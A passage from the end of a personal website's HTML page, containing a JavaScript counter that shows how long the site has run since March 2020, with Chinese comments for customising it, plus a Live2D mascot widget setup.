  var now = new Date();
  function createtime(){
      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
      now.setTime(now.getTime()+250);
      days = (now - grt ) / 1000 / 60 / 60 / 24;
      dnum = Math.floor(days);
      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
      hnum = Math.floor(hours);
      if(String(hnum).length ==1 ){
          hnum = "0" + hnum;
      }
      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
      mnum = Math.floor(minutes);
      if(String(mnum).length ==1 ){
                mnum = "0" + mnum;
      }
      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
      snum = Math.round(seconds);
      if(String(snum).length ==1 ){
                snum = "0" + snum;
      }
      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
  }  //此次自定义显示内容
  setInterval("createtime()",250);
  </script>
</div>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
